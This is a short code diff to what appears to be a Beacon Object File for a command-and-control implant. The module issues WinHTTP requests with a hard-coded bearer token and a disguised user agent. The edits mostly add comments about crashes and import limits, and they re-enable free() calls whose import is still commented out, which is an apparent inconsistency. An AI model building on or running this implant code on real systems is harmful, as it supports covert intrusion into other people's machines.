@@ -380,7 +380,7 @@ extern "C" {
     	DFR_LOCAL(MSVCRT, _swprintf);
         DFR_LOCAL(MSVCRT, malloc);
         DFR_LOCAL(MSVCRT, wcslen);
-        //DFR_LOCAL(MSVCRT, free);
+        //DFR_LOCAL(MSVCRT, free);                    // Causes a :no slot for function (reduce number of Win32 APIs called)" BOF error.
 	    DFR_LOCAL(WINHTTP, WinHttpOpen);
 	    DFR_LOCAL(WINHTTP, WinHttpConnect);
 	    DFR_LOCAL(WINHTTP, WinHttpOpenRequest);
@@ -399,7 +399,7 @@ extern "C" {
         DWORD dataRead = 0;
 
         const wchar_t * authbear = L"cygvhbiknjVXg";
-        //authhdr = (wchar_t *)malloc(wcslen(authbear) * sizeof(wchar_t));    // We didint account the the "Authorization: Bearer " portion here which causes a crash
+        //authhdr = (wchar_t *)malloc(wcslen(authbear) * sizeof(wchar_t));    // WE didint account the the AUthorization: Bearer portion here which causes a crash
         authhdr = (wchar_t *)malloc((wcslen(authbear) + wcslen(L"Authorization: Bearer ") + 1) * sizeof(wchar_t));
 
 	    _swprintf(authhdr, L"Authorization: Bearer %ls", authbear);
@@ -413,7 +413,7 @@ if (!pszOutBuffer) {
     BeaconPrintf(CALLBACK_ERROR, "Memory Allocation Failed for OutBuffer.\n");
     return;
 }
-//SecureZeroMemory(pszOutBuffer, 55000);
+//SecureZeroMemory(pszOutBuffer, 55000);                        //Cant import without killing the beacon
 
 // Open session
 HINTERNET hSession = WinHttpOpen(L"Mozilla/5.06", 
@@ -479,8 +479,8 @@ if (hRequest) WinHttpCloseHandle(hRequest);
 if (hConnect) WinHttpCloseHandle(hConnect);
 if (hSession) WinHttpCloseHandle(hSession);
 
-//if (pszOutBuffer) free(pszOutBuffer);
-//if (authhdr) free(authhdr);
+if (pszOutBuffer) free(pszOutBuffer);
+if (authhdr) free(authhdr);
 
 
 
